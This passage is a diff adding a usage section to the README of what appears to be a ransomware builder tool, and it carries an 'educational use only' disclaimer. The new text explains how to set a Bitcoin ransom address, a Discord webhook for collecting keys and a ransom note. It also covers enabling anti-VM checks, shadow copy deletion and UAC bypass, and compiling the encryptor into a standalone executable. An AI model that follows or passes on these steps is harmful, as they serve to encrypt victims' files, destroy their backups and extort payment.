@@ -44,4 +44,14 @@ This tool is for EDUCATIONAL USE ONLY. The developers are not responsible for an
    Why Python Files Obfsucated ??
 
     Anyone Editing The tools And seling the tools but im publishing the tools for free
-  
+
+
+  📖 Usage 
+
+    Configuration: Enter your Bitcoin address, Discord Webhook, and custom ransom note in the "Config & Note" tab. 
+    Modules: Toggle features like Anti-VM, Shadow Copy Deletion, and UAC Bypass in the "Advanced Modules" tab. 
+    Build: 
+         Click "Save Encryptor" to get the raw Python script.
+         Click "Build Encryptor EXE" to compile a standalone .exe file (located in the dist/ folder).
+          
+    Recovery: Use the generated Decryptor (input the key sent to your webhook) to restore files. 
